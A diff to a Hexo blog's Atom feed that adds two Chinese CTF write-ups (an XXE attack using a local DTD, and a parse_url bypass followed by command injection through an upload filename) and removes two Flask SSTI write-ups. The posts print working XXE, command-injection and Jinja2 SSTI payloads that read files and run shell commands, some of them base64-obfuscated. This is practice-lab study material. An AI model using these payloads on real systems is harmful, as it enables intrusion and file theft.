@@ -6,10 +6,70 @@
   <link href="http://lll-nnn.github.io/atom.xml" rel="self"/>
   
   <link href="http://lll-nnn.github.io/"/>
-  <updated>2021-07-14T00:46:44.558Z</updated>
+  <updated>2021-08-01T04:38:54.712Z</updated>
   <id>http://lll-nnn.github.io/</id>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Bnv</title>
+    <link href="http://lll-nnn.github.io/2021/08/01/BUU91/"/>
+    <id>http://lll-nnn.github.io/2021/08/01/BUU91/</id>
+    <published>2021-08-01T04:10:36.000Z</published>
+    <updated>2021-08-01T04:38:54.712Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="GoogleCTF2019-Quals-Bnv"><a href="#GoogleCTF2019-Quals-Bnv" class="headerlink" title="[GoogleCTF2019 Quals]Bnv"></a>[GoogleCTF2019 Quals]Bnv</h2><p><img src="https://ftp.bmp.ovh/imgs/2021/08/5a5f87e50976a9cd.png"><br><code>submit</code>抓包   </p><pre><code>POST /api/search HTTP/1.1Host: c430f277-c1c5-4e12-bb0b-b09fef668afa.node4.buuoj.cnUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-type: application/jsonContent-Length: 38Origin: http://c430f277-c1c5-4e12-bb0b-b09fef668afa.node4.buuoj.cnConnection: closeReferer: http://c430f277-c1c5-4e12-bb0b-b09fef668afa.node4.buuoj.cn/&#123;&quot;message&quot;:&quot;135601360123502401401250&quot;&#125;       </code></pre><p><code>json</code><br>尝试sqli，不行<br>有json的地方可能存在<code>xxe</code><br><code>Content-type</code>改为<code>application/xml</code>   </p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [&lt;!ELEMENT message (#PCDATA)&gt;&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &gt;]&gt;&lt;message&gt;&amp;xxe;&lt;/message&gt;</code></pre><p>返回<code>No result found</code>     </p><p>看来不行    </p><p>WP：</p><p><a href="https://www.dazhuanlan.com/xlllovelife/topics/1220539"><code>利用本地DTD文件进行XXE</code></a>       </p><p>payload:</p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message[    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;    &lt;!ENTITY % ISOamso &#39;    &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///flag&quot;&gt;    &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///aaaaa/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;    &amp;#x25;eval;    &amp;#x25;error;&#39;&gt;%local_dtd;]&gt;</code></pre>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;GoogleCTF2019-Quals-Bnv&quot;&gt;&lt;a href=&quot;#GoogleCTF2019-Quals-Bnv&quot; class=&quot;headerlink&quot; title=&quot;[GoogleCTF2019 Quals]Bnv&quot;&gt;&lt;/a&gt;[GoogleCTF2019 Q</summary>
+      
+    
+    
+    
+    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
+    
+    <category term="xxe" scheme="http://lll-nnn.github.io/categories/CTF/xxe/"/>
+    
+    
+    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
+    
+    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
+    
+    <category term="xxe" scheme="http://lll-nnn.github.io/tags/xxe/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Eating_cms</title>
+    <link href="http://lll-nnn.github.io/2021/08/01/BUU90/"/>
+    <id>http://lll-nnn.github.io/2021/08/01/BUU90/</id>
+    <published>2021-08-01T03:49:47.000Z</published>
+    <updated>2021-08-01T04:27:07.094Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="N1CTF-2018-eating-cms"><a href="#N1CTF-2018-eating-cms" class="headerlink" title="[N1CTF 2018]eating_cms"></a>[N1CTF 2018]eating_cms</h2><h4 id="parse-url-解析漏洞"><a href="#parse-url-解析漏洞" class="headerlink" title="parse_url()解析漏洞"></a><code>parse_url()</code>解析漏洞</h4><ul><li><p><code>function.php</code>中</p><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_directory</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>&#123;    $keywords = [<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;manage&quot;</span>,<span class="hljs-string">&quot;ffffllllaaaaggg&quot;</span>];    $uri = parse_url($_SERVER[<span class="hljs-string">&quot;REQUEST_URI&quot;</span>]);    parse_str($uri[<span class="hljs-string">&#x27;query&#x27;</span>], $query);<span class="hljs-comment">//    var_dump($query);</span><span class="hljs-comment">//    die();</span>    <span class="hljs-keyword">foreach</span>($keywords <span class="hljs-keyword">as</span> $token)    &#123;        <span class="hljs-keyword">foreach</span>($query <span class="hljs-keyword">as</span> $k =&gt; $v)        &#123;            <span class="hljs-keyword">if</span> (stristr($k, $token))                hacker();            <span class="hljs-keyword">if</span> (stristr($v, $token))                hacker();        &#125;    &#125;&#125;</code></pre><p><code>http://675a4ec5-c964-4b92-a667-7415df780f0f.node4.buuoj.cn/user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg</code></p><p>这样就会被匹配到，不能读取；但是如果这样<code>///user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg</code>parse_url就会返回<code>false</code>；读取成功。</p><p><img src="https://ftp.bmp.ovh/imgs/2021/08/777d762da5a7bc08.png"></p><p><strong>漏洞问题只存在于php5.4.7以前</strong></p><hr><p>真正的上传地址<code>http://675a4ec5-c964-4b92-a667-7415df780f0f.node4.buuoj.cn/user.php?page=m4aaannngggeee</code></p><pre><code class="hljs php"><span class="hljs-comment">//upllloadddd.php</span><span class="hljs-meta">&lt;?php</span>$allowtype = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;gif&quot;</span>,<span class="hljs-string">&quot;png&quot;</span>,<span class="hljs-string">&quot;jpg&quot;</span>);$size = <span class="hljs-number">10000000</span>;$path = <span class="hljs-string">&quot;./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>;$filename = $_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<span class="hljs-keyword">if</span>(is_uploaded_file($_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]))&#123;    <span class="hljs-keyword">if</span>(!move_uploaded_file($_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>],$path.$filename))&#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error:can not move&quot;</span>);    &#125;&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error:not an upload file！&quot;</span>);&#125;$newfile = $path.$filename;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;file upload success&lt;br /&gt;&quot;</span>;<span class="hljs-keyword">echo</span> $filename;$picdata = system(<span class="hljs-string">&quot;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>.$filename.<span class="hljs-string">&quot; | base64 -w 0&quot;</span>);  <span class="hljs-comment">//system命令执行，抓包改filename即可</span><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;data:image/png;base64,&quot;</span>.$picdata.<span class="hljs-string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;<span class="hljs-keyword">if</span>($_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;error&#x27;</span>]&gt;<span class="hljs-number">0</span>)&#123;    unlink($newfile);    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Upload file error: &quot;</span>);&#125;$ext = array_pop(explode(<span class="hljs-string">&quot;.&quot;</span>,$_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]));<span class="hljs-keyword">if</span>(!in_array($ext,$allowtype))&#123;    unlink($newfile);&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>payload：</p><blockquote><p><code>;cd ..;ls;#</code></p><p><code>;cd ..;cat flag_233333;#</code></p><p><strong><strong>****</strong></strong>或者*<strong><strong><strong><strong><strong>****</strong></strong></strong></strong></strong></p><pre><code class="hljs php">|| `<span class="hljs-keyword">echo</span> bHMgLw== |base64 -d`ls /|| `<span class="hljs-keyword">echo</span> Y2F0IC9mbGFnXzIzMzMzMyA= |base64 -d` cat /flag_233333</code></pre></blockquote></li></ul>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;N1CTF-2018-eating-cms&quot;&gt;&lt;a href=&quot;#N1CTF-2018-eating-cms&quot; class=&quot;headerlink&quot; title=&quot;[N1CTF 2018]eating_cms&quot;&gt;&lt;/a&gt;[N1CTF 2018]eating_cms</summary>
+      
+    
+    
+    
+    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
+    
+    <category term="rce" scheme="http://lll-nnn.github.io/categories/CTF/rce/"/>
+    
+    
+    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
+    
+    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
+    
+    <category term="rce" scheme="http://lll-nnn.github.io/tags/rce/"/>
+    
+  </entry>
   
   <entry>
     <title>异或^</title>
@@ -589,50 +649,6 @@
     <category term="SQL" scheme="http://lll-nnn.github.io/tags/SQL/"/>
     
     <category term="二次注入" scheme="http://lll-nnn.github.io/tags/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Double Secret</title>
-    <link href="http://lll-nnn.github.io/2021/04/27/BUU78/"/>
-    <id>http://lll-nnn.github.io/2021/04/27/BUU78/</id>
-    <published>2021-04-27T07:42:47.000Z</published>
-    <updated>2021-04-27T08:46:02.105Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title="_-__-"></a><code>_-__-</code></h2><p>打开是这样<br><img src="https://img10.360buyimg.com/ddimg/jfs/t1/172299/33/6670/3057/6087c133E05eb4964/f7d5c0725165dfea.png" alt="01.png">       </p><p>各种找，发现<code>robots.txt</code><br>有一句话—–<code>It is Android ctf</code><br>????    </p><p>然后就扫目录，<code>/secrect</code>      </p><p>得到：<code>Tell me your secret.I will encrypt it so others can&#39;t see</code>       </p><p>传入参数：<code>?secrect=123</code><br>—-&gt;<code>d]</code>      </p><p>然后试试其他的，感觉也没什么规律        </p><p>当我输了一个大的数后，  报错了<br><code>?secrect=123123</code><br><img src="https://img12.360buyimg.com/ddimg/jfs/t1/164560/32/20921/70003/6087c295Ee2b4b2b0/3375b41da3b33055.png" alt="02.png"><br>然后就不知道怎么继续了     </p><p>WP       </p><p>主要点：<br><img src="https://img13.360buyimg.com/ddimg/jfs/t1/189991/37/260/20393/6087c2e6E7772c1a4/0a96aad8ab0d1ac7.png" alt="03.png">      </p><p>对传入的参数进行RC4解密，然后经过<code>render_template_string</code><br>这里存在SSTI      </p><p>RC4加密脚本         </p><pre><code><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rc4_main</span>(<span class="hljs-params">key=<span class="hljs-string">&quot;init_key&quot;</span>, message=<span class="hljs-string">&quot;init_message&quot;</span></span>):</span>  <span class="hljs-comment"># 返回加密后得内容</span>    s_box = rc4_init_sbox(key)    crypt = <span class="hljs-built_in">str</span>(rc4_excrypt(message, s_box))    <span class="hljs-keyword">return</span> crypt<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rc4_init_sbox</span>(<span class="hljs-params">key</span>):</span>    s_box = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))    j = <span class="hljs-number">0</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):        j = (j + s_box[i] + <span class="hljs-built_in">ord</span>(key[i % <span class="hljs-built_in">len</span>(key)])) % <span class="hljs-number">256</span>        s_box[i], s_box[j] = s_box[j], s_box[i]    <span class="hljs-keyword">return</span> s_box<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rc4_excrypt</span>(<span class="hljs-params">plain, box</span>):</span>    res = []    i = j = <span class="hljs-number">0</span>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> plain:        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>        j = (j + box[i]) % <span class="hljs-number">256</span>        box[i], box[j] = box[j], box[i]        t = (box[i] + box[j]) % <span class="hljs-number">256</span>        k = box[t]        res.append(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(s) ^ k))    cipher = <span class="hljs-string">&quot;&quot;</span>.join(res)    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(base64.b64encode(cipher.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)), <span class="hljs-string">&#x27;utf-8&#x27;</span>)key = <span class="hljs-string">&quot;HereIsTreasure&quot;</span>  <span class="hljs-comment"># 此处为密文</span>message = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入明文:\n&quot;</span>)enc_base64 = rc4_main(key, message)enc_init = <span class="hljs-built_in">str</span>(base64.b64decode(enc_base64), <span class="hljs-string">&#x27;utf-8&#x27;</span>)enc_url = parse.quote(enc_init)print(<span class="hljs-string">&quot;rc4加密后的url编码:&quot;</span> + enc_url)<span class="hljs-comment"># print(&quot;rc4加密后的base64编码&quot;+enc_base64)</span></code></pre></code></pre><p>明文输入SSTI的payload：<br><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls /').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code>     </p><p><img src="https://img13.360buyimg.com/ddimg/jfs/t1/166916/2/20756/717273/6087c89fEf400f1c8/5d5e711f5e5060ff.png" alt="05.png">      </p><p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/186127/13/1163/8759/6087c863E6220db00/67e1250969f3a7eb.png" alt="04.png">        </p><p>虽然有个报错（那个safe函数），但还是得到了结果。</p><p><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat /flag.txt').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code><br>得到flag       </p><p><a href="https://blog.csdn.net/qq_41381461/article/details/100991617?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-3.control&dist_request_id=&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-3.control">Rc4加密</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h2 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;_-__-&quot;&gt;&lt;/a&gt;&lt;code&gt;_-__-&lt;/code&gt;&lt;/h2&gt;&lt;p&gt;打开是这样&lt;br&gt;&lt;img src=&quot;https://img10.360buyimg.com/ddimg/jf</summary>
-      
-    
-    
-    
-    
-    <category term="wp" scheme="http://lll-nnn.github.io/tags/wp/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>I_&lt;3_Flask</title>
-    <link href="http://lll-nnn.github.io/2021/04/26/BUU77/"/>
-    <id>http://lll-nnn.github.io/2021/04/26/BUU77/</id>
-    <published>2021-04-26T13:02:48.000Z</published>
-    <updated>2021-04-26T13:13:37.941Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="1-1"><a href="#1-1" class="headerlink" title="1_1"></a>1_1</h2><p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/161519/39/21188/9767/6086ba66E2717eebd/6a88b62e64abede0.png" alt="01.png">       </p><p>题目是flask，应该是SSTI了吧<br>但没参数        </p><p><a href="https://github.com/rakjong/Arjun"><code>arjun</code></a><br>这个可以来爆破参数<br>先下载，然后到arjun目录下<br><img src="https://img13.360buyimg.com/ddimg/jfs/t1/180871/9/1120/185944/6086bbb1E090ab472/52e2d85cb4d99503.png" alt="02.png">       </p><p>安装<br><img src="https://img12.360buyimg.com/ddimg/jfs/t1/196052/31/68/531183/6086bbb4E1c038775/a9233572bd309699.png" alt="03.png">        </p><p>使用<br><img src="https://img11.360buyimg.com/ddimg/jfs/t1/166728/7/20579/248205/6086bbb1E09bb265d/265b5c678e16dd73.png" alt="04.png">        </p><p>爆破出参数是name        </p><p>除此之外就没啥了<br>payload：<code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[182].__init__.__globals__.__builtins__['eval']("__import__('os').popen('ls').read()")&#125;&#125;</code>       </p><p><code>&#123;&#123;config.__class__.__init__.__globals__['os'].popen('ls').read()&#125;&#125;</code><br>两个都行<img src="https://img12.360buyimg.com/ddimg/jfs/t1/189306/16/158/12638/6086bc79E75a9f880/16bb47b996587c46.png" alt="05.png"></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h2 id=&quot;1-1&quot;&gt;&lt;a href=&quot;#1-1&quot; class=&quot;headerlink&quot; title=&quot;1_1&quot;&gt;&lt;/a&gt;1_1&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://img12.360buyimg.com/ddimg/jfs/t1/161519/39/21188</summary>
-      
-    
-    
-    
-    
-    <category term="wp" scheme="http://lll-nnn.github.io/tags/wp/"/>
     
   </entry>
   
